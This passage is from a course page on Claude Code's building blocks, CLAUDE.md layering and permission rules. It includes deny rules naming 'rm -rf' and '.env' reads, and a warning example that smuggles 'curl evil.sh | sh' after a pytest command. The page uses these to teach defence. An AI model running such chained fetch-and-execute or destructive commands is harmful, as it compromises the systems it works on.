@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 3: Claude Code — Claude Developer (CCDV-F) course — XploreAI</title>
+<meta name="description" content="A small domain with a long list of names. Know what each of Claude Code&#x27;s building blocks is for (rules, skills, commands, subagents, memory, hooks, settings), how CLAUDE.md files and settings are layered, and how to run Claude Code without a person at the keyboard, in scripts and CI.">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="XploreAI">
+<meta property="og:title" content="Module 3: Claude Code — Claude Developer (CCDV-F) course">
+<meta property="og:description" content="A small domain with a long list of names. Know what each of Claude Code&#x27;s building blocks is for (rules, skills, commands, subagents, memory, hooks, settings), how CLAUDE.md files and settings are layered, and how to run Claude Code without a person at the keyboard, in scripts and CI.">
+<meta property="og:url" content="https://xploreai.co.in/courses/claude-developer/module-3/">
+<meta property="og:image" content="https://xploreai.co.in/assets/og-image.jpg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/courses/claude-developer/course.css?v=1792998013">
+</head>
+<body>
+
+<nav>
+  <div class="wrap bar">
+    <a class="wordmark" href="/">xplore<span>ai</span></a>
+    <ul>
+      <li><a href="/#agents">Solutions</a></li>
+      <li><a href="/#stories">Success Stories</a></li>
+      <li><a href="/#subscribe">Newsletter</a></li>
+      <li><a href="/learn.html" aria-current="page">Learn AI</a></li>
+      <li><a class="btn" href="https://wa.me/919769686931?text=Hi%20XploreAI%2C%20I%27m%20interested%20in%20AI%20automation!">Get Started</a></li>
+    </ul>
+  </div>
+</nav>
+
+<main class="cca">
+<header class="mhero wrap">
+  <p class="crumb"><a href="/learn.html">Learn AI</a> / <a href="../">Claude Developer (CCDV-F) course</a> / Module 3</p>
+  <span class="pill">MODULE 3 OF 8 · DOMAIN 3 · 3.1% OF THE EXAM · 3 SESSIONS</span>
+  <h1>Claude Code<i>.</i></h1>
+  <p class="lede">A small domain with a long list of names. Know what each of Claude Code's building blocks is for (rules, skills, commands, subagents, memory, hooks, settings), how CLAUDE.md files and settings are layered, and how to run Claude Code without a person at the keyboard, in scripts and CI.</p>
+  <div class="dl"><a class="btn" href="#s3-1">Start session 3.1 →</a> <a class="btn ghost" href="../code/module-3.py" download>Download the Python</a></div>
+</header>
+<div class="wrap layout">
+  <aside class="toc" aria-label="Sessions"><p>In this module</p><ol><li><a href="#s3-1"><span>3.1</span>Core components</a></li><li><a href="#s3-2"><span>3.2</span>CLAUDE.md, settings and commands</a></li><li><a href="#s3-3"><span>3.3</span>Headless mode and CI/CD</a></li></ol></aside>
+  <div class="content">
+<section class="session" id="s3-1"><p class="snum">Session 3.1</p><h2>Core components</h2><p>Claude Code is Anthropic's <strong>agentic coding tool</strong>. It runs in your terminal, IDE, desktop app or browser, works directly in a repository, and loops through the same cycle you built in Module 1: read files, decide, run a tool (edit, search, run tests), check the result, continue. It isn't "Claude in a terminal": it's Claude inside a software engineering workflow, with configuration that shapes how it behaves.</p><figure class="seq anim" style="--c:3"><figcaption>One request in Claude Code</figcaption><div class="actors"><b>You</b><b>Claude Code</b><b>Repository</b></div><div class="lane"><div class="m r" style="grid-column:1/3;--s:2;--k:0"><span>"The login tests fail. Find out why and fix it."</span><i></i></div><div class="m r" style="grid-column:2/4;--s:2;--k:1"><span>Grep and Read the auth module and the tests</span><i></i></div><div class="m r" style="grid-column:2/4;--s:2;--k:2"><span>Bash: pytest tests/test_login.py</span><i></i></div><div class="m l reply" style="grid-column:2/4;--s:2;--k:3"><span>2 failures: token expiry compared in local time</span><i></i></div><div class="m r" style="grid-column:2/4;--s:2;--k:4"><span>Edit auth/tokens.py (asks permission first)</span><i></i></div><div class="m r" style="grid-column:2/4;--s:2;--k:5"><span>Bash: pytest (all pass)</span><i></i></div><div class="m l reply" style="grid-column:1/3;--s:2;--k:6"><span>What was wrong, what changed, and the test result</span><i></i></div></div></figure><h3>The building blocks, and when to use each</h3><p>The exam blueprint names five core components (rules, skills, commands, agents and agent memory). Hooks and settings complete the picture. The skill being tested is choosing the right one for a need.</p><div class="tbl"><table><thead><tr><th>Component</th><th>What it is</th><th>Use it for</th><th>Lives in</th></tr></thead><tbody><tr><td><strong>CLAUDE.md</strong></td><td>Standing project instructions, loaded every session</td><td>Build and test commands, conventions, things to always know</td><td><code>CLAUDE.md</code> at several levels (3.2)</td></tr><tr><td><strong>Rules</strong></td><td>Instructions in separate files, optionally limited to certain paths</td><td>Conventions that apply to part of the codebase ("in <code>api/</code>, ...")</td><td><code>.claude/rules/*.md</code></td></tr><tr><td><strong>Skills</strong></td><td>A packaged procedure with instructions and optional scripts, loaded only when relevant</td><td>Repeatable multi-step workflows: release notes, a migration checklist</td><td><code>.claude/skills/&lt;name&gt;/SKILL.md</code></td></tr><tr><td><strong>Slash commands</strong></td><td>Something you trigger explicitly by typing <code>/name</code></td><td>Built-in operations (<code>/clear</code>, <code>/compact</code>) and your team's own shortcuts</td><td>Built in, or custom files you add</td></tr><tr><td><strong>Subagents</strong></td><td>Specialised assistants with their own prompt, tools and <strong>own context window</strong></td><td>Independent or noisy work: a code reviewer, a test runner, a researcher</td><td><code>.claude/agents/*.md</code></td></tr><tr><td><strong>Agent memory</strong></td><td>What persists across sessions: CLAUDE.md you write, plus auto memory Claude saves as it works</td><td>Lessons learned, preferences, project facts</td><td>Memory files managed by Claude Code</td></tr><tr><td><strong>Hooks</strong></td><td>Your scripts, run at fixed points in the life cycle</td><td>Anything that must <em>always</em> happen or <em>never</em> happen</td><td><code>settings.json</code></td></tr><tr><td><strong>settings.json</strong></td><td>Configuration Claude Code enforces</td><td>Permissions, model, environment, hooks, plugins</td><td><code>.claude/settings.json</code> and others</td></tr></tbody></table></div><aside class="call concept"><b>The idea</b><p><strong>Guidance or guarantee?</strong> CLAUDE.md, rules, skills and commands are all <em>read by the model</em>: they make a behaviour likely. Hooks and <code>settings.json</code> permissions are <em>applied by Claude Code</em>: they make it certain. When a question says "must never" or "always, without exception", the answer is a hook or a permission rule.</p></aside><h3>Skills load in stages</h3><p>A skill's full instructions aren't put into every session. At start-up Claude Code loads only each skill's short <strong>description</strong>; the body is read when Claude decides the skill is relevant (or you call it by name), and any scripts or reference files inside it are read only if needed. That staged loading is why you can install many skills without filling the context window. Here's the arithmetic for a team with 25 skills.</p><div class="cell"><div class="code"><div class="lab"><span>Python</span><button class="copy" type="button">Copy</button></div><pre><code class="language-python">skills = 25
+description_tokens = 60          # name + one-line description, always loaded
+body_tokens = 2_500              # the full SKILL.md, loaded when used
+reference_tokens = 6_000         # optional extra files and scripts, read only if needed
+used_per_session = 2
+
+always_on = skills * description_tokens
+if_everything_loaded = skills * (description_tokens + body_tokens + reference_tokens)
+typical = always_on + used_per_session * body_tokens
+
+print(f&quot;descriptions only (start of every session): {always_on:&gt;7,} tokens&quot;)
+print(f&quot;typical session using {used_per_session} skills:            {typical:&gt;7,} tokens&quot;)
+print(f&quot;if all 25 skills were loaded in full:       {if_everything_loaded:&gt;7,} tokens&quot;)</code></pre></div><div class="out"><div class="lab"><span>Output · produced by running this code</span></div><pre>descriptions only (start of every session):   1,500 tokens
+typical session using 2 skills:              6,500 tokens
+if all 25 skills were loaded in full:       214,000 tokens</pre></div></div><aside class="call read"><b>How to read it</b><p>Descriptions cost 1,500 tokens; a session that uses two skills about 6,500; loading everything up front would cost over 200,000. The flip side: Claude decides whether to use a skill <strong>from its description alone</strong>, so a vague description means a skill that never gets picked.</p></aside><h3>Where does it go?</h3><p>Here's the choice as a small decision function, run on eight real needs. The rules are a summary of the guidance above, not an official algorithm.</p><div class="cell"><div class="code"><div class="lab"><span>Python</span><button class="copy" type="button">Copy</button></div><pre><code class="language-python">def where_does_it_go(need):
+    n = need.lower()
+    if any(w in n for w in (&quot;must never&quot;, &quot;always block&quot;, &quot;every time without fail&quot;, &quot;after every edit&quot;)):
+        return &quot;hook (or a permission rule)&quot;
+    if any(w in n for w in (&quot;allow&quot;, &quot;deny&quot;, &quot;which model&quot;, &quot;environment variable&quot;)):
+        return &quot;settings.json&quot;
+    if any(w in n for w in (&quot;only in&quot;, &quot;files under&quot;, &quot;for the api folder&quot;)):
+        return &quot;path-scoped rule&quot;
+    if any(w in n for w in (&quot;own context&quot;, &quot;independently&quot;, &quot;in parallel&quot;, &quot;separate reviewer&quot;)):
+        return &quot;subagent&quot;
+    if any(w in n for w in (&quot;step-by-step procedure&quot;, &quot;checklist&quot;, &quot;workflow with scripts&quot;)):
+        return &quot;skill&quot;
+    if any(w in n for w in (&quot;i type&quot;, &quot;shortcut&quot;, &quot;on demand&quot;)):
+        return &quot;custom slash command (or a skill you invoke)&quot;
+    return &quot;CLAUDE.md&quot;
+
+needs = [
+    &quot;Run the formatter after every edit&quot;,
+    &quot;The test command is `pytest -q` and the app uses FastAPI&quot;,
+    &quot;Only in files under app/api/: return errors as RFC 7807 problem JSON&quot;,
+    &quot;A 9-step release checklist with a changelog script&quot;,
+    &quot;Review each PR with a separate reviewer that doesn&#x27;t see the author&#x27;s reasoning&quot;,
+    &quot;Must never read .env files&quot;,
+    &quot;A shortcut I type to summarise today&#x27;s changes for stand-up&quot;,
+    &quot;Deny `git push --force` and allow `pytest`&quot;,
+]
+for need in needs:
+    print(f&quot;{where_does_it_go(need):&lt;44} ← {need}&quot;)</code></pre></div><div class="out"><div class="lab"><span>Output · produced by running this code</span></div><pre>hook (or a permission rule)                  ← Run the formatter after every edit
+CLAUDE.md                                    ← The test command is `pytest -q` and the app uses FastAPI
+path-scoped rule                             ← Only in files under app/api/: return errors as RFC 7807 problem JSON
+skill                                        ← A 9-step release checklist with a changelog script
+subagent                                     ← Review each PR with a separate reviewer that doesn&#x27;t see the author&#x27;s reasoning
+hook (or a permission rule)                  ← Must never read .env files
+custom slash command (or a skill you invoke) ← A shortcut I type to summarise today&#x27;s changes for stand-up
+settings.json                                ← Deny `git push --force` and allow `pytest`</pre></div></div><div class="quiz" data-multi="0"><p class="q"><b>Practice question</b>A team wants Claude Code to follow a 12-step database migration procedure, with two helper scripts, whenever someone asks for a migration, but without loading those instructions into every unrelated session. What fits best?</p><div class="opts"><button type="button" data-ok="0">A. Put all 12 steps in the project CLAUDE.md</button><button type="button" data-ok="1">B. Package the procedure and scripts as a skill with a clear description</button><button type="button" data-ok="0">C. A PreToolUse hook</button><button type="button" data-ok="0">D. A permission rule in settings.json</button></div><p class="why" hidden>A skill packages a reusable procedure with supporting files, and only its description is loaded until it's needed. CLAUDE.md is loaded into every session; hooks and permissions enforce actions rather than teaching a procedure.</p></div><div class="quiz" data-multi="0"><p class="q"><b>Practice question</b>Why delegate a large codebase search to a subagent rather than doing it in the main session?</p><div class="opts"><button type="button" data-ok="0">A. Subagents can use tools the main session can't</button><button type="button" data-ok="1">B. The subagent works in its own context window and returns only a summary, keeping the main session's context focused</button><button type="button" data-ok="0">C. Subagents are always cheaper because they use a smaller model</button><button type="button" data-ok="0">D. Subagents remember earlier sessions automatically</button></div><p class="why" hidden>Context isolation is the main benefit: the search output stays in the subagent's window. A subagent may use a cheaper model or a restricted tool set, but that's configuration, not the reason subagents exist.</p></div></section><section class="session" id="s3-2"><p class="snum">Session 3.2</p><h2>CLAUDE.md, settings and commands</h2><h3>Starting a repository: /init</h3><p><code>/init</code> reads the codebase and drafts a <code>CLAUDE.md</code>: how to build and test, how the code is organised, and the conventions it spots. If a CLAUDE.md already exists, it suggests improvements instead of overwriting it. Treat the draft as a starting point: cut what's obvious from the code, and add what only your team knows.</p><h3>The CLAUDE.md hierarchy</h3><p>CLAUDE.md files can sit at several levels. They don't override each other: Claude Code <strong>combines</strong> them, from the broadest down to the most specific, so a project file can add to (or refine) what a user file says.</p><div class="tbl"><table><thead><tr><th>Level</th><th>Location</th><th>For</th><th>In Git?</th></tr></thead><tbody><tr><td><strong>Managed policy</strong></td><td>Set by IT (e.g. <code>/Library/Application Support/ClaudeCode/CLAUDE.md</code> on macOS)</td><td>Organisation-wide rules</td><td>No: deployed centrally</td></tr><tr><td><strong>User</strong></td><td><code>~/.claude/CLAUDE.md</code></td><td>Your personal preferences, in every project</td><td>No</td></tr><tr><td><strong>Project</strong></td><td><code>./CLAUDE.md</code> or <code>./.claude/CLAUDE.md</code></td><td>Team conventions for the repo</td><td><strong>Yes</strong></td></tr><tr><td><strong>Local</strong></td><td><code>./CLAUDE.local.md</code></td><td>Your notes for this repo only</td><td>No: add to <code>.gitignore</code></td></tr><tr><td><strong>Directory</strong></td><td><code>some/folder/CLAUDE.md</code></td><td>Conventions for one part of the repo</td><td>Yes</td></tr></tbody></table></div><p>When they load matters as much as where they are:</p><figure class="flow anim" style="--n:4"><figcaption>When each CLAUDE.md enters the context</figcaption><ol><li style="--i:0"><b>At launch</b><span>Managed and user files, plus every CLAUDE.md (and CLAUDE.local.md) from the filesystem root down to the folder you started in.</span></li><li style="--i:1"><b>On demand</b><span>A CLAUDE.md in a subfolder loads only when Claude reads or edits a file in that folder.</span></li><li style="--i:2"><b>Imports</b><span>An @path/to/file line pulls another file in when the CLAUDE.md is loaded.</span></li><li style="--i:3"><b>Every session</b><span>Starts fresh, so the files are reloaded each time; that's what makes them memory.</span></li></ol></figure><p>Here's that loading logic as code, run on a small monorepo. The tree is invented; the rules are the ones above.</p><div class="cell"><div class="code"><div class="lab"><span>Python</span><button class="copy" type="button">Copy</button></div><pre><code class="language-python">import posixpath as pp
+
+FILES = {   # every CLAUDE.md-style file that exists on this machine
+    &quot;~/.claude/CLAUDE.md&quot;: &quot;user: prefer British spelling; explain diffs briefly&quot;,
+    &quot;/work/CLAUDE.md&quot;: &quot;work: all repos use pre-commit&quot;,
+    &quot;/work/clinic/CLAUDE.md&quot;: &quot;project: FastAPI app; run `pytest -q`; dates as 30 Oct 2026&quot;,
+    &quot;/work/clinic/CLAUDE.local.md&quot;: &quot;local (mine): my test DB is on port 5433&quot;,
+    &quot;/work/clinic/app/api/CLAUDE.md&quot;: &quot;api: errors as RFC 7807 problem JSON&quot;,
+    &quot;/work/clinic/web/CLAUDE.md&quot;: &quot;web: React + TypeScript, no default exports&quot;,
+}
+
+def ancestors(path):
+    parts, out = path.strip(&quot;/&quot;).split(&quot;/&quot;), []
+    for i in range(len(parts) + 1):
+        out.append(&quot;/&quot; + &quot;/&quot;.join(parts[:i]) if i else &quot;/&quot;)
+    return out
+
+def loaded(start_dir, touched=()):
+    order = [&quot;~/.claude/CLAUDE.md&quot;]
+    for d in ancestors(start_dir):                              # root → start folder, at launch
+        for name in (&quot;CLAUDE.md&quot;, &quot;CLAUDE.local.md&quot;):
+            p = pp.join(d, name)
+            if p in FILES: order.append(p)
+    for f in touched:                                           # subfolders, on demand
+        d = pp.dirname(f)
+        while d.startswith(start_dir) and d != start_dir:
+            p = pp.join(d, &quot;CLAUDE.md&quot;)
+            if p in FILES and p not in order: order.append(p)
+            d = pp.dirname(d)
+    return order
+
+print(&quot;Started in /work/clinic, nothing opened yet:&quot;)
+for p in loaded(&quot;/work/clinic&quot;): print(&quot;  &quot;, FILES[p])
+print(&quot;\n...then Claude edits app/api/bookings.py:&quot;)
+for p in loaded(&quot;/work/clinic&quot;, [&quot;/work/clinic/app/api/bookings.py&quot;])[-1:]: print(&quot;  +&quot;, FILES[p])</code></pre></div><div class="out"><div class="lab"><span>Output · produced by running this code</span></div><pre>Started in /work/clinic, nothing opened yet:
+   user: prefer British spelling; explain diffs briefly
+   work: all repos use pre-commit
+   project: FastAPI app; run `pytest -q`; dates as 30 Oct 2026
+   local (mine): my test DB is on port 5433
+
+...then Claude edits app/api/bookings.py:
+  + api: errors as RFC 7807 problem JSON</pre></div></div><aside class="call read"><b>How to read it</b><p>The web folder's rules never load in this session because Claude never touched a file there. The work-level file loads even though it isn't in the repo, because it's in a parent folder of where Claude Code was started.</p></aside><h3>Diagnosing "Claude ignores our conventions"</h3><p>When a team convention seems to be ignored, the cause is usually <em>where</em> it was written, not the model.</p><div class="tbl"><table><thead><tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody><tr><td>Works for one developer, not the others</td><td>The rule is in that person's <code>~/.claude/CLAUDE.md</code> or <code>CLAUDE.local.md</code></td><td>Move it to the project <code>CLAUDE.md</code> and commit it</td></tr><tr><td>A folder's rule is ignored at the start of a task</td><td>Subfolder files load only when Claude touches a file there</td><td>Put cross-cutting rules in the root file, or a path-scoped rule</td></tr><tr><td>Followed most of the time, but not always</td><td>Instructions are guidance, not enforcement</td><td>Turn "must" rules into hooks or permission rules</td></tr><tr><td>Followed loosely</td><td>Vague wording ("write clean code")</td><td>Make it specific and checkable ("functions under 40 lines; type hints on public functions")</td></tr><tr><td>Ignored in a long session</td><td>Context rot: the instruction is buried</td><td><code>/clear</code> or <code>/compact</code>; keep CLAUDE.md short</td></tr></tbody></table></div><p>Use <code>/memory</code> to see which memory files are loaded and edit them, and <code>/context</code> to see what is taking up the context window.</p><h3>settings.json and permissions</h3><p>Settings are the configuration Claude Code <strong>applies itself</strong>. Module 2 covered the files and their precedence: managed, then command line, then local project, then shared project, then user. For this module, focus on <strong>permission rules</strong>, the most tested part.</p><div class="cell file"><div class="code"><div class="lab"><span>.claude/settings.json</span><button class="copy" type="button">Copy</button></div><pre><code class="language-json">{
+  &quot;permissions&quot;: {
+    &quot;allow&quot;: [&quot;Bash(pytest *)&quot;, &quot;Bash(npm run lint)&quot;, &quot;Read(./src/**)&quot;],
+    &quot;ask&quot;:   [&quot;Bash(git push *)&quot;, &quot;WebFetch&quot;],
+    &quot;deny&quot;:  [&quot;Read(.env)&quot;, &quot;Bash(rm -rf *)&quot;, &quot;Edit(./migrations/**)&quot;]
+  }
+}</code></pre></div></div><p>Each rule is <code>Tool</code> or <code>Tool(specifier)</code>. For Bash, <code>Bash(npm run lint)</code> matches that exact command and <code>Bash(pytest *)</code> matches any command starting <code>pytest </code>. File rules use gitignore-style patterns. Rules are checked <strong>deny first, then ask, then allow</strong>; the first match decides, and anything unmatched falls back to the current permission mode (normally: ask).</p><p>Here's an evaluator for that file, simplified to these rule shapes, run on eight tool calls.</p><div class="cell"><div class="code"><div class="lab"><span>Python</span><button class="copy" type="button">Copy</button></div><pre><code class="language-python">import fnmatch
+
+SETTINGS = {&quot;allow&quot;: [&quot;Bash(pytest *)&quot;, &quot;Bash(npm run lint)&quot;, &quot;Read(./src/**)&quot;],
+            &quot;ask&quot;:   [&quot;Bash(git push *)&quot;, &quot;WebFetch&quot;],
+            &quot;deny&quot;:  [&quot;Read(.env)&quot;, &quot;Bash(rm -rf *)&quot;, &quot;Edit(./migrations/**)&quot;]}
+
+def matches(rule, tool, arg):
+    name, _, spec = rule.partition(&quot;(&quot;)
+    if name != tool: return False
+    if not spec: return True                                   # bare tool name: every use
+    spec = spec[:-1]
+    if tool == &quot;Bash&quot;:
+        return arg == spec or (spec.endswith(&quot; *&quot;) and arg.startswith(spec[:-1]))
+    if &quot;/&quot; not in spec:                                        # bare file name: any depth
+        return pp.basename(arg) == spec
+    return fnmatch.fnmatch(arg, spec.replace(&quot;**&quot;, &quot;*&quot;))
+
+def decide(tool, arg=&quot;&quot;):
+    for verdict in (&quot;deny&quot;, &quot;ask&quot;, &quot;allow&quot;):
+        for rule in SETTINGS[verdict]:
+            if matches(rule, tool, arg):
+                return verdict, rule
+    return &quot;ask&quot;, &quot;(no rule: default mode)&quot;
+
+calls = [(&quot;Bash&quot;, &quot;pytest -q tests/&quot;), (&quot;Bash&quot;, &quot;npm run lint&quot;), (&quot;Bash&quot;, &quot;npm run deploy&quot;),
+         (&quot;Bash&quot;, &quot;git push origin main&quot;), (&quot;Bash&quot;, &quot;rm -rf build&quot;), (&quot;Read&quot;, &quot;./src/app/main.py&quot;),
+         (&quot;Read&quot;, &quot;./config/.env&quot;), (&quot;Edit&quot;, &quot;./migrations/0042_add_index.py&quot;)]
+for tool, arg in calls:
+    verdict, rule = decide(tool, arg)
+    print(f&quot;{verdict.upper():&lt;6} {tool}({arg})&quot;.ljust(48), &quot;←&quot;, rule)</code></pre></div><div class="out"><div class="lab"><span>Output · produced by running this code</span></div><pre>ALLOW  Bash(pytest -q tests/)                    ← Bash(pytest *)
+ALLOW  Bash(npm run lint)                        ← Bash(npm run lint)
+ASK    Bash(npm run deploy)                      ← (no rule: default mode)
+ASK    Bash(git push origin main)                ← Bash(git push *)
+DENY   Bash(rm -rf build)                        ← Bash(rm -rf *)
+ALLOW  Read(./src/app/main.py)                   ← Read(./src/**)
+DENY   Read(./config/.env)                       ← Read(.env)
+DENY   Edit(./migrations/0042_add_index.py)      ← Edit(./migrations/**)</pre></div></div><aside class="call read"><b>How to read it</b><p><code>npm run deploy</code> isn't covered by the exact <code>npm run lint</code> rule, so it falls back to asking. <code>rm -rf build</code> is denied even though nothing in <code>allow</code> would have permitted it anyway: deny rules are the safety net. <code>.env</code> is caught in a subfolder because a bare file name matches at any depth.</p></aside><aside class="call warn"><b>Watch out</b><p>A Bash rule can't fully understand shell syntax. <code>Bash(pytest *)</code> would also match <code>pytest; curl evil.sh | sh</code> if your matching were naive (don't rely on patterns alone). For anything dangerous, combine deny rules with a PreToolUse hook and, for real isolation, a sandbox or container.</p></aside><h3>Rules for part of the codebase</h3><p>Rules are instructions in their own files under <code>.claude/rules/</code> (or <code>~/.claude/rules/</code> for yourself). A rule with no <code>paths</code> loads at launch, like the project CLAUDE.md. A rule with <code>paths</code> in its front matter loads only when Claude reads or edits a matching file, which keeps API conventions out of a session spent on the front end.</p><div class="cell file"><div class="code"><div class="lab"><span>.claude/rules/api-errors.md</span><button class="copy" type="button">Copy</button></div><pre><code class="language-markdown">---
+paths: [&quot;app/api/**/*.py&quot;]
+---
+# API error responses
+- Return errors as RFC 7807 problem JSON: type, title, status, detail.
+- Never include stack traces or SQL in `detail`.
+- 422 for validation errors, 409 for booking conflicts.</code></pre></div></div><h3>Slash commands: built-in and your own</h3><p>Slash commands are explicit triggers: <em>you</em> decide to run them. The built-ins worth knowing for the exam:</p><div class="tbl"><table><thead><tr><th>Command</th><th>Does</th></tr></thead><tbody><tr><td><code>/init</code></td><td>Draft or improve the project CLAUDE.md</td></tr><tr><td><code>/memory</code></td><td>View and edit the loaded memory files; turn auto memory on or off</td></tr><tr><td><code>/clear</code></td><td>Start a fresh conversation (files untouched)</td></tr><tr><td><code>/compact [focus]</code></td><td>Summarise the conversation so far to free context, keeping what you name</td></tr><tr><td><code>/context</code></td><td>Show what is using the context window</td></tr><tr><td><code>/resume</code></td><td>Pick up an earlier session</td></tr><tr><td><code>/rewind</code></td><td>Go back to a checkpoint: restore code, conversation or both</td></tr><tr><td><code>/model</code>, <code>/permissions</code>, <code>/hooks</code>, <code>/config</code></td><td>Inspect or change configuration</td></tr><tr><td><code>/plan</code></td><td>Switch to plan mode: explore and propose, no edits</td></tr><tr><td><code>/review</code>, <code>/security-review</code></td><td>Review the current changes</td></tr><tr><td><code>/cost</code> (or <code>/usage</code>)</td><td>Token use and estimated cost</td></tr></tbody></table></div><p>Your own commands are Markdown files. A file at <code>.claude/commands/standup.md</code> becomes <code>/standup</code>; the same front matter works for <strong>skills</strong>, which Anthropic now recommends for new work, because a skill can also be picked up automatically when relevant. Arguments arrive as <code>$ARGUMENTS</code> (everything you typed after the command) or <code>$0</code>, <code>$1</code>... for individual words.</p><div class="cell file"><div class="code"><div class="lab"><span>.claude/skills/fix-issue/SKILL.md</span><button class="copy" type="button">Copy</button></div><pre><code class="language-markdown">---
+description: Fix a GitHub issue by number. Use when asked to fix, resolve or close an issue.
+argument-hint: &lt;issue-number&gt;
+allowed-tools: Bash(gh issue view *) Bash(pytest *) Read Edit
+---
+Fix issue #$ARGUMENTS.
+
+1. Read it with `gh issue view $ARGUMENTS`.
+2. Write a failing test that reproduces it.
+3. Make the smallest change that passes the test; run the full suite.
+4. Summarise the cause and the fix in under 100 words, ready for the PR description.</code></pre></div></div><p>Here's what happens when you type <code>/fix-issue 214</code>: the arguments are substituted into the body, and that text becomes the instruction Claude works from.</p><div class="cell"><div class="code"><div class="lab"><span>Python</span><button class="copy" type="button">Copy</button></div><pre><code class="language-python">import re
+
+SKILL = &quot;&quot;&quot;Fix issue #$ARGUMENTS.
+
+1. Read it with `gh issue view $ARGUMENTS`.
+2. Write a failing test that reproduces it.&quot;&quot;&quot;
+
+def expand(body, typed):
+    words = typed.split()
+    body = body.replace(&quot;$ARGUMENTS&quot;, typed)
+    return re.sub(r&quot;\$(\d+)&quot;, lambda m: words[int(m.group(1))] if int(m.group(1)) &lt; len(words) else &quot;&quot;, body)
+
+print(expand(SKILL, &quot;214&quot;))
+print(&quot;\npositional form:&quot;, expand(&quot;Compare $0 with $1 and list breaking changes.&quot;, &quot;v2.3 v3.0&quot;))</code></pre></div><div class="out"><div class="lab"><span>Output · produced by running this code</span></div><pre>Fix issue #214.
+
+1. Read it with `gh issue view 214`.
+2. Write a failing test that reproduces it.
+
+positional form: Compare v2.3 with v3.0 and list breaking changes.</pre></div></div><h3>Subagents and agent memory</h3><p>A subagent is a Markdown file with front matter: a name, a <strong>description</strong> (how Claude decides when to delegate), and optionally its tools, model and memory. It runs in <strong>its own context window</strong> and hands back only its final message.</p><div class="cell file"><div class="code"><div class="lab"><span>.claude/agents/migration-reviewer.md</span><button class="copy" type="button">Copy</button></div><pre><code class="language-markdown">---
+name: migration-reviewer
+description: Reviews Alembic migrations for locking, data loss and missing downgrades. Use after any change under migrations/.
+tools: Read, Grep, Glob
+model: haiku
+memory: project
+---
+You review database migrations for a PostgreSQL booking system.
+Flag: table rewrites on large tables, missing CONCURRENTLY on index builds,
+NOT NULL without a default, irreversible downgrades. Report each finding with file:line.
+Record recurring problems in your memory so future reviews check for them first.</code></pre></div></div><p><strong>Agent memory</strong> comes in two forms. <strong>CLAUDE.md</strong> is memory <em>you</em> write. <strong>Auto memory</strong> is memory <em>Claude</em> writes: notes it saves as it works (your preferences, corrections, project facts), stored per project under <code>~/.claude/projects/&lt;project&gt;/memory/</code> with a <code>MEMORY.md</code> index loaded at the start of each session. A subagent's <code>memory</code> field gives it its own memory directory (<code>project</code>, <code>user</code> or <code>local</code> scope), so a reviewer can learn across runs.</p><h3>Sessions and checkpoints</h3><div class="tbl"><table><thead><tr><th>Need</th><th>How</th></tr></thead><tbody><tr><td>Continue the most recent session here</td><td><code>claude --continue</code> (or <code>-c</code>)</td></tr><tr><td>Pick an older one</td><td><code>claude --resume</code>, or <code>/resume</code>, by name or ID</td></tr><tr><td>Try an alternative without losing this path</td><td>Fork: <code>--fork-session</code> or <code>/branch</code></td></tr><tr><td>Undo Claude's last edits</td><td><code>/rewind</code> (or Esc twice): restore code, conversation, or both</td></tr></tbody></table></div><aside class="call warn"><b>Watch out</b><p>Checkpoints track Claude's own file edits, not changes made through Bash commands or by other tools, and they're no substitute for Git. Commit before big changes.</p></aside><div class="quiz" data-multi="0"><p class="q"><b>Practice question</b>Every developer on a team wants the same <code>/release-notes</code> workflow, and it should also trigger when someone simply asks Claude for release notes. What is the best way to provide it?</p><div class="opts"><button type="button" data-ok="0">A. Each developer adds the steps to their <code>~/.claude/CLAUDE.md</code></button><button type="button" data-ok="1">B. A skill in the repository's <code>.claude/skills/release-notes/SKILL.md</code> with a clear description</button><button type="button" data-ok="0">C. A PreToolUse hook</button><button type="button" data-ok="0">D. An <code>allow</code> rule in settings.json</button></div><p class="why" hidden>A skill committed to the repo is shared with the team, can be invoked as <code>/release-notes</code>, and can also be chosen automatically from its description. User-level files aren't shared; hooks and permissions don't teach a workflow.</p></div><div class="quiz" data-multi="0"><p class="q"><b>Practice question</b>A convention in <code>app/api/CLAUDE.md</code> is followed when Claude edits API files but ignored when it plans a change from the repository root at the start of a session. Why?</p><div class="opts"><button type="button" data-ok="0">A. Directory CLAUDE.md files are never loaded</button><button type="button" data-ok="1">B. A subfolder CLAUDE.md loads only when Claude reads or edits a file in that folder</button><button type="button" data-ok="0">C. The root CLAUDE.md overrides it</button><button type="button" data-ok="0">D. It must be named CLAUDE.local.md</button></div><p class="why" hidden>Files in subfolders load on demand. Before Claude touches an API file, that convention isn't in context. Put cross-cutting rules in the root CLAUDE.md, or keep them in a path-scoped rule that loads with the files it governs.</p></div></section><section class="session" id="s3-3"><p class="snum">Session 3.3</p><h2>Headless mode and CI/CD</h2><p>Claude Code is interactive by default: it expects a person to read, approve and reply. Three separate ideas cover running it any other way. They answer different questions, so a scenario may need one, two or all three.</p><div class="tbl"><table><thead><tr><th>Idea</th><th>Question it answers</th><th>How</th></tr></thead><tbody><tr><td><strong>Headless</strong> (print mode)</td><td>Is a person at the keyboard?</td><td><code>claude -p "..."</code>: run the task, print the result, exit</td></tr><tr><td><strong>Streaming output</strong></td><td>How is the output delivered?</td><td><code>--output-format stream-json</code>: one JSON event per line, as it happens</td></tr><tr><td><strong>Auto mode</strong></td><td>Who approves each action?</td><td><code>--permission-mode auto</code>: a classifier model approves or blocks actions</td></tr></tbody></table></div><h3>Permission modes</h3><div class="tbl"><table><thead><tr><th>Mode</th><th>Claude may, without asking</th><th>Typical use</th></tr></thead><tbody><tr><td><code>default</code> (manual)</td><td>Read files</td><td>Normal interactive work</td></tr><tr><td><code>acceptEdits</code></td><td>Read and edit files, simple file operations</td><td>Trusted refactors you'll review in the diff</td></tr><tr><td><code>plan</code></td><td>Read and explore; no edits until you approve a plan</td><td>Big or risky changes: agree the plan first</td></tr><tr><td><code>auto</code></td><td>Most actions; 